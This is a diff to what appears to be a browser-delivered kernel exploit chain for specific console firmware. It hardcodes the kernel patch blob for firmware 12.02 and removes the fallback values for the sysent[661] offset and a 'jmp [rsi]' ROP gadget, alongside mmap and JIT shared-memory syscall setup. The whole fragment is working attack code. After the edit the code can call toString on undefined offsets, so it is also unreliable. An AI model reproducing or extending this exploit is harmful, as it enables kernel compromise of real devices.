@@ -204,19 +204,11 @@ function makeRpc(worker) {
     try {
         const params = new URLSearchParams(location.search);
 
-        const fwResolved = offsetsFor(navigator.userAgent);
-        const fwKey = fwResolved.key;
-        // off.kpatch wins when a firmware shares another's kernel and therefore
-        // its blob -- 12.02 uses 1200.bin. Otherwise derive it from the key.
-        const kpatchName = fwResolved.off && fwResolved.off.kpatch
-            ? "patches/" + fwResolved.off.kpatch
-            : fwKey ? "patches/" + fwKey.replace(".", "") + ".bin" : null;
+        const kpatchName = "patches/1200.bin";
         let kpatch = null;
         try {
-            if (kpatchName) {
-                const rsp = await fetch(kpatchName);
-                if (rsp.ok) kpatch = new Uint8Array(await rsp.arrayBuffer());
-            }
+            const rsp = await fetch(kpatchName);
+            if (rsp.ok) kpatch = new Uint8Array(await rsp.arrayBuffer());
         } catch (e) {
             mark("KPATCH-FETCH-FAILED", (e && e.message) ? e.message : String(e));
         }
@@ -3103,14 +3095,11 @@ function makeRpc(worker) {
                                 }
 
                                 const KOFF = offsetsFor(navigator.userAgent).off || {};
-                                const SYSENT_661 = KOFF.k_sysent_661 !== undefined
-                                    ? KOFF.k_sysent_661 : 0x1109350;
-                                const JMP_RSI_GADGET = KOFF.k_jmp_rsi !== undefined
-                                    ? KOFF.k_jmp_rsi : 0x71a21;
+                                const SYSENT_661 = KOFF.k_sysent_661;
+                                const JMP_RSI_GADGET = KOFF.k_jmp_rsi;
                                 mark("KOFF", "sysent[661]=0x" + SYSENT_661.toString(16)
                                     + " jmp[rsi]=0x" + JMP_RSI_GADGET.toString(16)
-                                    + "   source=" + (KOFF.k_sysent_661 !== undefined
-                                        ? "offsets table" : "built-in 11.00 fallback"));
+                                    + "   source=12.02 offsets");
                                 const PROT_READ = 1, PROT_WRITE = 2, PROT_EXEC = 4;
                                 const MAP_SHARED = 1, MAP_FIXED = 0x10;
                                 const SYS_MMAP = 0x1dd, SYS_JITSHM_CREATE = 0x215;
